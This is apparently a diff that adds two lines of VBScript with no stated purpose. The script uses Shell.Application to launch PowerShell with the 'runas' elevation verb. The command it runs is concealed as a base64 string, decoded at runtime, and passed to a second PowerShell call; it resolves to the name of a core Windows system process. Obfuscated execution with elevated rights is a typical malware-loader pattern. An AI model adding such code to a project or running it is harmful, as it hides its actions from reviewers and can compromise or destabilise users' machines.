@@ -1,0 +1,2 @@
+Set oShell = CreateObject("Shell.Application")
+oShell.ShellExecute "powershell.exe"," $run = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2luaW5pdA==')); powershell $run", "", "runas", 1
